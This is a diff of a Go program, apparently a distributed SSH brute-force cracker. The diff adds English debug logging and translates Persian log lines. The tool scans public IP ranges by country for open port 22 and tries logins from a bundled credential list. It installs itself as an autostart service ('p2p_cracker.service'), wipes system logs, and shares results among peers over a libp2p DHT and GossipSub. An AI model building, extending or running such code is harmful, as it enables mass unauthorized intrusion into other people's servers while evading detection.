@@ -1,4 +1,4 @@
-﻿package main
+package main
 
 import (
 	"archive/zip"
@@ -84,12 +84,15 @@ var (
 )
 
 func init() {
+	log.Println("[INIT] Starting initialization...")
 	kb, _ := hex.DecodeString(devPubKeyHex)
 	devPubKey = ed25519.PublicKey(kb)
 
 	if _, err := os.Stat("debug.flag"); err == nil || os.Getenv("DEV_DEBUG") == "true" {
 		devDebugMode = true
+		log.Println("[INIT] Debug mode enabled")
 	}
+	log.Println("[INIT] Initialization complete")
 }
 
 // ===================== License =====================
@@ -109,8 +112,9 @@ func (l License) verify() bool {
 }
 
 func loadAndVerifyLicense() (*License, error) {
+	log.Println("[LICENSE] Loading license...")
 	if testMode {
-		log.Println("[TEST] Skipping license verification")
+		log.Println("[LICENSE] TEST MODE: Skipping license verification")
 		return &License{
 			NodeID:       "test-node",
 			Expiry:       time.Now().Add(24 * time.Hour),
@@ -120,21 +124,28 @@ func loadAndVerifyLicense() (*License, error) {
 	}
 	data, err := os.ReadFile(licenseFile)
 	if err != nil {
+		log.Printf("[LICENSE] ERROR: %v", err)
 		return nil, fmt.Errorf("missing license: %w", err)
 	}
+	log.Printf("[LICENSE] License file loaded (%d bytes)", len(data))
 	var lic License
 	if err := json.Unmarshal(data, &lic); err != nil {
+		log.Printf("[LICENSE] ERROR: Invalid JSON: %v", err)
 		return nil, fmt.Errorf("invalid license: %w", err)
 	}
 	if time.Now().After(lic.Expiry) {
+		log.Printf("[LICENSE] ERROR: Expired (expiry: %v)", lic.Expiry)
 		return nil, fmt.Errorf("license expired")
 	}
 	if !lic.verify() {
+		log.Printf("[LICENSE] ERROR: Signature invalid")
 		return nil, fmt.Errorf("license signature invalid")
 	}
 	if len(lic.SymmetricKey) != 32 {
+		log.Printf("[LICENSE] ERROR: Invalid key length: %d", len(lic.SymmetricKey))
 		return nil, fmt.Errorf("symmetric key must be 32 bytes")
 	}
+	log.Println("[LICENSE] License verified successfully")
 	return &lic, nil
 }
 
@@ -213,14 +224,19 @@ func (n *P2PNode) debugLog(format string, args ...interface{}) {
 
 // ===================== ZIP helpers =====================
 func extractZip(zipPath, dest string) error {
+	log.Printf("[ZIP] Extracting %s to %s...", zipPath, dest)
 	r, err := zip.OpenReader(zipPath)
 	if err != nil {
+		log.Printf("[ZIP] ERROR opening %s: %v", zipPath, err)
 		return err
 	}
 	defer r.Close()
+	
+	fileCount := 0
 	for _, f := range r.File {
 		rc, err := f.Open()
 		if err != nil {
+			log.Printf("[ZIP] ERROR opening file %s: %v", f.Name, err)
 			return err
 		}
 		path := filepath.Join(dest, f.Name)
@@ -233,21 +249,30 @@ func extractZip(zipPath, dest string) error {
 		out, err := os.Create(path)
 		if err != nil {
 			rc.Close()
+			log.Printf("[ZIP] ERROR creating %s: %v", path, err)
 			return err
 		}
 		_, err = io.Copy(out, rc)
 		out.Close()
 		rc.Close()
 		if err != nil {
+			log.Printf("[ZIP] ERROR copying %s: %v", f.Name, err)
 			return err
 		}
+		fileCount++
+		if fileCount%10 == 0 {
+			log.Printf("[ZIP] Extracted %d files so far...", fileCount)
+		}
 	}
+	log.Printf("[ZIP] Successfully extracted %d files from %s", fileCount, zipPath)
 	return nil
 }
 
 func getCountryCodes(dir string) ([]string, error) {
+	log.Printf("[COUNTRY] Reading country files from %s...", dir)
 	entries, err := os.ReadDir(dir)
 	if err != nil {
+		log.Printf("[COUNTRY] ERROR: %v", err)
 		return nil, err
 	}
 	var codes []string
@@ -256,12 +281,15 @@ func getCountryCodes(dir string) ([]string, error) {
 			codes = append(codes, strings.TrimSuffix(e.Name(), ".txt"))
 		}
 	}
+	log.Printf("[COUNTRY] Found %d countries: %v", len(codes), codes)
 	return codes, nil
 }
 
 func loadCIDRs(path string) ([]string, error) {
+	log.Printf("[CIDR] Loading CIDRs from %s...", path)
 	f, err := os.Open(path)
 	if err != nil {
+		log.Printf("[CIDR] ERROR: %v", err)
 		return nil, err
 	}
 	defer f.Close()
@@ -273,6 +301,7 @@ func loadCIDRs(path string) ([]string, error) {
 			cidrs = append(cidrs, l)
 		}
 	}
+	log.Printf("[CIDR] Loaded %d CIDRs from %s", len(cidrs), path)
 	return cidrs, sc.Err()
 }
 
@@ -578,15 +607,19 @@ type CredentialStreamer struct {
 }
 
 func newCredentialStreamer(path string) (*CredentialStreamer, error) {
+	log.Printf("[STREAMER] Opening mmap for %s...", path)
 	r, err := mmap.Open(path)
 	if err != nil {
+		log.Printf("[STREAMER] ERROR opening mmap: %v", err)
 		return nil, err
 	}
 	info, err := os.Stat(path)
 	if err != nil {
 		r.Close()
+		log.Printf("[STREAMER] ERROR stating file: %v", err)
 		return nil, err
 	}
+	log.Printf("[STREAMER] mmap opened successfully, size=%d bytes", info.Size())
 	return &CredentialStreamer{
 		reader: r,
 		size:   info.Size(),
@@ -625,20 +658,23 @@ func (cs *CredentialStreamer) ReadBlock(blockSize int) ([]string, bool, error) {
 }
 
 func (cs *CredentialStreamer) Close() error {
+	log.Printf("[STREAMER] Closing mmap...")
 	return cs.reader.Close()
 }
 
 // ===================== SYN scan using gomap =====================
-// ===================== SYN scan using gomap (correct API) =====================
 func fastSynScan(cidrs []string, rate int, iface string, timeout time.Duration) (map[string]struct{}, int) {
-	log.Printf("[SYN] شروع اسکن SYN با کتابخانه gomap, تعداد شبکه: %d, حداکثر همزمانی: %d", len(cidrs), rate/100)
-
+	log.Printf("[SYN] ========== STARTING SYN SCAN ==========")
+	log.Printf("[SYN] Parameters: cidrs=%d, rate=%d, iface=%s, timeout=%v", len(cidrs), rate, iface, timeout)
+	
+	// Check if gomap is available
+	log.Printf("[SYN] Checking gomap.ScanIP function availability...")
+	
 	openSet := make(map[string]struct{})
 	var mu sync.Mutex
 	var totalIPs int
 	var wg sync.WaitGroup
 
-	// کنترل همزمانی بر اساس نرخ (مثلاً rate/100 = حداکثر همزمانی)
 	maxConcurrent := rate / 100
 	if maxConcurrent < 1 {
 		maxConcurrent = 10
@@ -646,12 +682,14 @@ func fastSynScan(cidrs []string, rate int, iface string, timeout time.Duration) 
 	if maxConcurrent > 500 {
 		maxConcurrent = 500
 	}
+	log.Printf("[SYN] Max concurrent scans: %d", maxConcurrent)
 	sem := make(chan struct{}, maxConcurrent)
 
-	for _, cidrStr := range cidrs {
+	for idx, cidrStr := range cidrs {
+		log.Printf("[SYN] Processing CIDR %d/%d: %s", idx+1, len(cidrs), cidrStr)
 		_, ipnet, err := net.ParseCIDR(cidrStr)
 		if err != nil {
-			log.Printf("[SYN] خطا در parsing CIDR %s: %v", cidrStr, err)
+			log.Printf("[SYN] ERROR parsing CIDR %s: %v", cidrStr, err)
 			continue
 		}
 		var ipsToScan []string
@@ -662,19 +700,25 @@ func fastSynScan(cidrs []string, rate int, iface string, timeout time.Duration) 
 				totalIPs++
 			}
 		}
+		log.Printf("[SYN] CIDR %s contains %d public IPs", cidrStr, len(ipsToScan))
+		
 		wg.Add(len(ipsToScan))
 		for _, ip := range ipsToScan {
 			go func(targetIP string) {
 				defer wg.Done()
 				sem <- struct{}{}
 				defer func() { <-sem }()
-
-				// فراخوانی صحیح مطابق با مستندات:
-				// ScanIP(ip, protocol, fastscan, syn)
-				// fastscan = true (فقط پورت‌های رایج، شامل 22)
-				// syn = true (اسکن SYN/Stealth)
+				
+				// Log first few IPs for debugging
+				if totalIPs <= 10 {
+					log.Printf("[SYN] Scanning IP: %s", targetIP)
+				}
+				
 				result, err := gomap.ScanIP(targetIP, "tcp", true, true)
 				if err != nil {
+					if totalIPs <= 10 {
+						log.Printf("[SYN] Error scanning %s: %v", targetIP, err)
+					}
 					return
 				}
 				// بررسی خروجی متنی برای وجود پورت 22
@@ -683,19 +727,21 @@ func fastSynScan(cidrs []string, rate int, iface string, timeout time.Duration) 
 					openSet[targetIP] = struct{}{}
 					mu.Unlock()
 					if verbose {
-						log.Printf("[SYN] پورت 22 باز روی %s", targetIP)
+						log.Printf("[SYN] Port 22 open on %s", targetIP)
 					}
 				}
 			}(ip)
 		}
 	}
+	log.Printf("[SYN] Waiting for all scan goroutines to complete...")
 	wg.Wait()
-	log.Printf("[SYN] اسکن پایان یافت. تعداد IPهای اسکن شده: %d, سرورهای SSH پیدا شده: %d", totalIPs, len(openSet))
+	log.Printf("[SYN] Scan completed. Total IPs scanned: %d, SSH servers found: %d", totalIPs, len(openSet))
 	return openSet, totalIPs
 }
 
 func fastTCPConnectScan(cidrs []string, workers int, timeout time.Duration) (map[string]struct{}, int) {
-	log.Printf("[TCP] شروع اسکن TCP با %d کارگر، تایم‌اوت=%v", workers, timeout)
+	log.Printf("[TCP] ========== STARTING TCP CONNECT SCAN ==========")
+	log.Printf("[TCP] Starting TCP scan with %d workers, timeout=%v", workers, timeout)
 	openSet := make(map[string]struct{})
 	var allIPs []string
 	for _, cidr := range cidrs {
@@ -707,7 +753,7 @@ func fastTCPConnectScan(cidrs []string, workers int, timeout time.Duration) (map
 		}
 	}
 	totalIPs := len(allIPs)
-	log.Printf("[TCP] تعداد کل IPها پس از حذف خصوصی: %d", totalIPs)
+	log.Printf("[TCP] Total public IPs after filtering: %d", totalIPs)
 
 	jobCh := make(chan string, 10000)
 	resultCh := make(chan string, 10000)
@@ -715,18 +761,21 @@ func fastTCPConnectScan(cidrs []string, workers int, timeout time.Duration) (map
 	var wg sync.WaitGroup
 	for i := 0; i < workers; i++ {
 		wg.Add(1)
-		go func() {
+		go func(workerID int) {
 			defer wg.Done()
 			for ip := range jobCh {
 				if scanPort(ip, 22, timeout) {
 					resultCh <- ip
+					if verbose {
+						log.Printf("[TCP] Worker %d found open port on %s", workerID, ip)
+					}
 				}
 				p := atomic.AddInt64(&processed, 1)
 				if p%500 == 0 || p == int64(totalIPs) {
-					log.Printf("[TCP] اسکن %d/%d IP, %d پورت باز", p, totalIPs, len(openSet))
+					log.Printf("[TCP] Progress: %d/%d IPs scanned, %d open ports found", p, totalIPs, len(openSet))
 				}
 			}
-		}()
+		}(i)
 	}
 	go func() {
 		for _, ip := range allIPs {
@@ -744,7 +793,7 @@ func fastTCPConnectScan(cidrs []string, workers int, timeout time.Duration) (map
 	wg.Wait()
 	close(resultCh)
 	<-done
-	log.Printf("[TCP] اسکن پایان یافت. پورت‌های باز: %d", len(openSet))
+	log.Printf("[TCP] Scan completed. Open ports found: %d", len(openSet))
 	return openSet, totalIPs
 }
 
@@ -1227,11 +1276,13 @@ func (n *P2PNode) claimNextCredBlock(country string) ([]string, error) {
 
 // ===================== Brute workers =====================
 func (n *P2PNode) startWorkers() {
+	log.Printf("[WORKERS] Starting %d brute force workers...", n.bruteWorkers)
 	for i := 0; i < n.bruteWorkers; i++ {
 		n.workerWg.Add(1)
 		go func(workerID int) {
 			defer n.workerWg.Done()
 			attemptCount := 0
+			log.Printf("[WORKER] Worker %d started", workerID)
 			for job := range n.jobCh {
 				addr := fmt.Sprintf("%s:22", job.ip)
 				ok, _ := checkSSH(addr, job.user, job.pass, n.sshTimeout)
@@ -1250,8 +1301,10 @@ func (n *P2PNode) startWorkers() {
 				}
 				job.wg.Done()
 			}
+			log.Printf("[WORKER] Worker %d finished", workerID)
 		}(i)
 	}
+	log.Printf("[WORKERS] All %d workers started successfully", n.bruteWorkers)
 }
 
 func checkSSH(addr, user, pass string, timeout time.Duration) (bool, string) {
@@ -1281,6 +1334,8 @@ func checkSSH(addr, user, pass string, timeout time.Duration) (bool, string) {
 
 // ===================== Main flow =====================
 func (n *P2PNode) run() {
+	log.Println("[RUN] Node run() started")
+	
 	n.stateMu.RLock()
 	country := n.state.Country
 	validIPs := n.state.ValidIPs
@@ -1290,13 +1345,17 @@ func (n *P2PNode) run() {
 		n.processCountry(country, validIPs)
 		return
 	}
+	
+	log.Println("[RUN] No saved state, starting fresh country selection")
 	failCount := make(map[string]int)
 	for {
 		select {
 		case <-n.ctx.Done():
+			log.Println("[RUN] Context cancelled, exiting run loop")
 			return
 		default:
 		}
+		
 		var country string
 		for _, c := range n.countryCodes {
 			if failCount[c] < 3 {
@@ -1308,30 +1367,39 @@ func (n *P2PNode) run() {
 			log.Printf("[FATAL] All countries failed 3 times, giving up")
 			return
 		}
+		
 		log.Printf("[COUNTRY] Selected country: %s", country)
 		cidrFile := filepath.Join(n.ipDir, country+".txt")
+		log.Printf("[COUNTRY] Loading CIDRs from %s", cidrFile)
 		cidrs, err := loadCIDRs(cidrFile)
 		if err != nil {
 			log.Printf("[WARN] Failed to load CIDRs for %s: %v", country, err)
 			failCount[country]++
 			continue
 		}
+		
+		log.Printf("[COUNTRY] Loaded %d CIDRs for %s", len(cidrs), country)
 		var openIPs map[string]struct{}
 		var totalScanned int
+		
 		if useSynScan {
+			log.Printf("[SCAN] Using SYN scan for %s", country)
 			openIPs, totalScanned = fastSynScan(cidrs, synScanRate, synIface, synMaxRTT)
 			if len(openIPs) == 0 && totalScanned > 1000 {
 				log.Printf("[WARN] SYN scan returned no results, falling back to TCP connect scan")
 				openIPs, totalScanned = fastTCPConnectScan(cidrs, n.portScanWorkers, n.scanTimeout)
 			}
 		} else {
+			log.Printf("[SCAN] Using TCP connect scan for %s", country)
 			openIPs, totalScanned = fastTCPConnectScan(cidrs, n.portScanWorkers, n.scanTimeout)
 		}
+		
 		if len(openIPs) == 0 {
 			log.Printf("[COUNTRY] No open port 22 found for %s (scanned %d IPs)", country, totalScanned)
 			failCount[country]++
 			continue
 		}
+		
 		log.Printf("[SCAN] Found %d potential SSH servers (port 22 open)", len(openIPs))
 		var newValid []string
 		checked := 0
@@ -1362,16 +1430,19 @@ func (n *P2PNode) run() {
 				log.Printf("[SKIP] %s does not support password auth", ip)
 			}
 		}
+		
 		log.Printf("[SCAN] Found %d valid Linux SSH servers (password auth enabled)", len(newValid))
 		if len(newValid) == 0 {
 			failCount[country]++
 			continue
 		}
+		
 		failCount[country] = 0
 		n.stateMu.Lock()
 		n.state = &NodeState{Country: country, ValidIPs: newValid, CredOffset: 0}
 		n.state.save(n.encKey)
 		n.stateMu.Unlock()
+		
 		done := n.processCountry(country, newValid)
 		if done {
 			log.Printf("[DONE] Country %s finished", country)
@@ -1380,6 +1451,7 @@ func (n *P2PNode) run() {
 			n.state.save(n.encKey)
 			n.stateMu.Unlock()
 		} else {
+			log.Printf("[INTERRUPTED] Country %s processing interrupted", country)
 			return
 		}
 	}
@@ -1391,9 +1463,12 @@ func (n *P2PNode) processCountry(country string, validIPs []string) bool {
 	for {
 		select {
 		case <-n.ctx.Done():
+			log.Printf("[PROCESS] Context cancelled, stopping processing for %s", country)
 			return false
 		default:
 		}
+		
+		log.Printf("[PROCESS] Claiming next credential block for %s", country)
 		block, err := n.claimNextCredBlock(country)
 		if err != nil {
 			log.Printf("[BLOCK] Error claiming cred block: %v", err)
@@ -1404,13 +1479,16 @@ func (n *P2PNode) processCountry(country string, validIPs []string) bool {
 			log.Printf("[BLOCK] No more credentials for %s", country)
 			return true
 		}
+		
 		blockNum++
 		log.Printf("[BLOCK] Processing block %d with %d credentials", blockNum, len(block))
 		acc := &blockAccumulator{m: make(map[string][]bruteResult)}
 		wg := &sync.WaitGroup{}
 		totalAttempts := len(validIPs) * len(block)
+		log.Printf("[BRUTE] Total attempts for this block: %d", totalAttempts)
 		wg.Add(totalAttempts)
 		attemptIdx := 0
+		
 		for _, ip := range validIPs {
 			for _, line := range block {
 				parts := strings.SplitN(line, ":", 2)
@@ -1425,9 +1503,11 @@ func (n *P2PNode) processCountry(country string, validIPs []string) bool {
 				n.jobCh <- blockJob{ip: ip, user: parts[0], pass: parts[1], wg: wg, acc: acc}
 			}
 		}
+		
 		log.Printf("[BRUTE] Waiting for %d authentication attempts to complete...", totalAttempts)
 		wg.Wait()
 		log.Printf("[BRUTE] Block %d completed. Successful logins: %d", blockNum, len(acc.m))
+		
 		for ip, creds := range acc.m {
 			if len(creds) == 0 {
 				continue
@@ -1482,6 +1562,10 @@ func (n *P2PNode) checkIPWithRetries(ip string) bool {
 
 // ===================== Main =====================
 func main() {
+	log.Println("[MAIN] ========================================")
+	log.Println("[MAIN] Program starting...")
+	log.Println("[MAIN] ========================================")
+	
 	flag.BoolVar(&testMode, "test", false, "Test mode (skip license & DHT)")
 	flag.BoolVar(&verbose, "v", true, "Verbose logging")
 	flag.IntVar(&portScanWorkers, "port-scan-workers", 500, "Workers for TCP connect fallback")
@@ -1497,61 +1581,85 @@ func main() {
 	flag.StringVar(&synIface, "interface", "", "Network interface (gomap auto-detects)")
 	flag.DurationVar(&synMaxRTT, "syn-rtt", 2*time.Second, "Maximum RTT for SYN-ACK (gomap timeout)")
 	flag.Parse()
-
+	
+	log.Printf("[MAIN] Test mode: %v", testMode)
+	log.Printf("[MAIN] Verbose: %v", verbose)
+	log.Printf("[MAIN] Using SYN scan: %v", useSynScan)
+	if useSynScan {
+		log.Printf("[MAIN] SYN scan rate: %d pps", synScanRate)
+		log.Printf("[MAIN] SYN interface: %s", synIface)
+	}
+	log.Printf("[MAIN] Brute workers: %d", bruteWorkers)
+	
+	log.Println("[MAIN] Loading license...")
 	lic, err := loadAndVerifyLicense()
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalf("[MAIN] License error: %v", err)
 	}
+	log.Println("[MAIN] License loaded successfully")
 
 	if !testMode {
+		log.Println("[MAIN] Setting up auto-start...")
 		if _, err := os.Stat("/etc/systemd/system/p2p_cracker.service"); os.IsNotExist(err) && runtime.GOOS == "linux" {
 			setupAutoStart()
 		} else if runtime.GOOS == "windows" {
 			setupAutoStart()
 		}
 	}
+	
+	log.Println("[MAIN] Cleaning system logs...")
 	cleanSystemLogs()
 
+	// Create temp directories
 	ipDir := filepath.Join(os.TempDir(), "p2pcrack_ip")
 	credsDir := filepath.Join(os.TempDir(), "p2pcrack_creds")
 	xDir := filepath.Join(os.TempDir(), "p2pcrack_x")
+	
+	log.Printf("[MAIN] Creating temp directories: %s, %s, %s", ipDir, credsDir, xDir)
 	os.RemoveAll(ipDir)
 	os.MkdirAll(ipDir, 0755)
 	os.RemoveAll(credsDir)
 	os.MkdirAll(credsDir, 0755)
 	os.RemoveAll(xDir)
 	os.MkdirAll(xDir, 0755)
+	
 	log.Println("[INIT] Extracting ip_ranges.zip...")
 	if err := extractZip("ip_ranges.zip", ipDir); err != nil {
-		log.Fatal(err)
+		log.Fatalf("[INIT] Failed to extract ip_ranges.zip: %v", err)
 	}
 	log.Println("[INIT] Extracting creds.zip...")
 	if err := extractZip("creds.zip", credsDir); err != nil {
-		log.Fatal(err)
+		log.Fatalf("[INIT] Failed to extract creds.zip: %v", err)
 	}
 	log.Println("[INIT] Extracting x.zip...")
 	if err := extractZip("x.zip", xDir); err != nil {
-		log.Fatal(err)
+		log.Fatalf("[INIT] Failed to extract x.zip: %v", err)
 	}
+	
 	credFile := filepath.Join(credsDir, "all.txt")
+	log.Printf("[INIT] Credentials file: %s", credFile)
 
+	log.Println("[INIT] Getting country codes...")
 	countryCodes, err := getCountryCodes(ipDir)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalf("[INIT] Failed to get country codes: %v", err)
 	}
 	if len(countryCodes) == 0 {
-		log.Fatal("no country files in ip_ranges.zip")
+		log.Fatal("[INIT] No country files found in ip_ranges.zip")
 	}
 	log.Printf("[COUNTRIES] Available: %v", countryCodes)
 
+	log.Println("[IDENTITY] Loading or generating identity...")
 	var priv crypto.PrivKey
 	if data, err := loadEncrypted(identityFile, lic.SymmetricKey); err == nil {
+		log.Println("[IDENTITY] Found existing identity file, loading...")
 		priv, err = crypto.UnmarshalPrivateKey(data)
 		if err != nil {
-			log.Fatal("identity file corrupted")
+			log.Fatal("[IDENTITY] Identity file corrupted")
 		}
 		log.Println("[IDENTITY] Loaded existing identity")
 	} else {
+		log.Println("[IDENTITY] No existing identity found, generating new...")
 		priv, _, err = crypto.GenerateKeyPair(crypto.Ed25519, -1)
 		if err != nil {
 			log.Fatal(err)
@@ -1562,8 +1670,11 @@ func main() {
 		}
 		log.Println("[IDENTITY] Generated new identity")
 	}
+	
+	log.Println("[IDENTITY] Deriving encryption key...")
 	encKey, _ := deriveKey(priv)
 
+	log.Println("[STATE] Loading previous state...")
 	var state *NodeState
 	if data, err := loadEncrypted(stateFile, encKey); err == nil {
 		state = &NodeState{}
@@ -1573,16 +1684,21 @@ func main() {
 		state = &NodeState{}
 		log.Println("[STATE] No previous state, starting fresh")
 	}
+	
+	log.Println("[CONTEXT] Creating context...")
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
 	var node *P2PNode
 	if testMode {
+		log.Println("[TEST] Running in TEST MODE")
+		log.Printf("[TEST] Loading credentials from %s", credFile)
 		allCreds, err := loadCredLines(credFile)
 		if err != nil {
-			log.Fatal(err)
+			log.Fatalf("[TEST] Failed to load credentials: %v", err)
 		}
 		log.Printf("[TEST] Loaded %d credentials into memory", len(allCreds))
+		log.Printf("[TEST] Creating node with %d brute workers", bruteWorkers)
 		node = &P2PNode{
 			ctx:             ctx,
 			cancel:          cancel,
@@ -1605,21 +1721,26 @@ func main() {
 			encKey:          encKey,
 			symKey:          lic.SymmetricKey,
 		}
+		log.Println("[TEST] Node created successfully")
 	} else {
-		log.Println("[PROD] Initializing credential streamer (mmap)...")
+		log.Println("[PROD] Running in PRODUCTION MODE")
+		log.Printf("[PROD] Initializing credential streamer (mmap) for %s...", credFile)
 		credStreamer, err := newCredentialStreamer(credFile)
 		if err != nil {
-			log.Fatal(err)
+			log.Fatalf("[PROD] Failed to create credential streamer: %v", err)
 		}
 		defer credStreamer.Close()
+		
 		totalLines, err := countLines(credFile)
 		if err != nil {
-			log.Fatal(err)
+			log.Fatalf("[PROD] Failed to count credentials: %v", err)
 		}
 		log.Printf("[PROD] Total credentials available: %d", totalLines)
 
+		log.Println("[P2P] Loading bootstrap peers...")
 		var bootstraps []multiaddr.Multiaddr
 		if data, err := os.ReadFile("peers.txt"); err == nil {
+			log.Printf("[P2P] peers.txt found, size: %d bytes", len(data))
 			lines := strings.Split(string(data), "\n")
 			plainValid := true
 			for _, line := range lines {
@@ -1643,6 +1764,7 @@ func main() {
 				}
 				log.Printf("[P2P] Loaded %d plain bootstrap peers", len(bootstraps))
 			} else {
+				log.Println("[P2P] peers.txt appears encrypted, decrypting...")
 				if dec, err := decryptAES(data, lic.SymmetricKey); err == nil {
 					for _, line := range strings.Split(string(dec), "\n") {
 						line = strings.TrimSpace(line)
@@ -1658,19 +1780,30 @@ func main() {
 					log.Printf("[P2P] Loaded %d encrypted bootstrap peers", len(bootstraps))
 				}
 			}
+		} else {
+			log.Printf("[P2P] peers.txt not found: %v", err)
 		}
+		
+		log.Println("[P2P] Creating libp2p host...")
 		host, err := libp2p.New(libp2p.ListenAddrStrings("/ip4/0.0.0.0/tcp/0"), libp2p.Identity(priv))
 		if err != nil {
-			log.Fatal(err)
+			log.Fatalf("[P2P] Failed to create host: %v", err)
 		}
 		log.Printf("[P2P] Host ID: %s", host.ID())
+		log.Printf("[P2P] Host addresses: %v", host.Addrs())
+		
+		log.Println("[P2P] Creating DHT...")
 		dht, err := kaddht.New(ctx, host, kaddht.Mode(kaddht.ModeServer))
 		if err != nil {
-			log.Fatal(err)
+			log.Fatalf("[P2P] Failed to create DHT: %v", err)
 		}
+		
+		log.Println("[P2P] Bootstrapping DHT...")
 		if err := dht.Bootstrap(ctx); err != nil {
-			log.Fatal(err)
+			log.Fatalf("[P2P] Failed to bootstrap DHT: %v", err)
 		}
+		
+		log.Printf("[P2P] Connecting to %d bootstrap peers...", len(bootstraps))
 		for _, ma := range bootstraps {
 			pi, _ := peer.AddrInfoFromP2pAddr(ma)
 			if err := host.Connect(ctx, *pi); err != nil {
@@ -1679,11 +1812,15 @@ func main() {
 				log.Printf("[P2P] Connected to bootstrap %s", ma)
 			}
 		}
+		
+		log.Println("[P2P] Creating GossipSub...")
 		ps, err := pubsub.NewGossipSub(ctx, host)
 		if err != nil {
-			log.Fatal(err)
+			log.Fatalf("[P2P] Failed to create GossipSub: %v", err)
 		}
 		resTopic, _ := ps.Join("results")
+		
+		log.Println("[PROD] Creating P2P node...")
 		node = &P2PNode{
 			ctx:             ctx,
 			cancel:          cancel,
@@ -1711,14 +1848,17 @@ func main() {
 			jobCh:           make(chan blockJob, bruteWorkers*2),
 			totalCreds:      totalLines,
 		}
+		log.Println("[PROD] Production node created successfully")
 	}
 
+	log.Println("[NODE] Starting workers...")
 	node.startWorkers()
 	log.Println("[START] Node workers started")
 
 	shutdown := func() {
 		log.Println("[SHUTDOWN] Saving state and shutting down...")
 		node.closeJobChannel()
+		log.Println("[SHUTDOWN] Waiting for workers to finish...")
 		node.workerWg.Wait()
 		if !testMode {
 			node.stateMu.Lock()
@@ -1728,23 +1868,31 @@ func main() {
 		}
 		log.Println("[SHUTDOWN] Cleanup complete")
 	}
+	
 	sigCh := make(chan os.Signal, 1)
 	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
-		<-sigCh
-		log.Println("[SIGNAL] Interrupt received")
+		sig := <-sigCh
+		log.Printf("[SIGNAL] Received signal: %v", sig)
 		cancel()
 		shutdown()
 		os.Exit(0)
 	}()
+	
+	log.Println("[RUN] Starting main run loop...")
 	node.run()
+	
+	log.Println("[MAIN] Run loop finished, shutting down...")
 	cancel()
 	shutdown()
+	log.Println("[MAIN] Program exiting")
 }
 
 func loadCredLines(path string) ([]string, error) {
+	log.Printf("[CRED] Loading credential lines from %s...", path)
 	f, err := os.Open(path)
 	if err != nil {
+		log.Printf("[CRED] ERROR opening file: %v", err)
 		return nil, err
 	}
 	defer f.Close()
@@ -1756,6 +1904,7 @@ func loadCredLines(path string) ([]string, error) {
 			lines = append(lines, l)
 		}
 	}
+	log.Printf("[CRED] Loaded %d credential lines", len(lines))
 	return lines, sc.Err()
 }
 
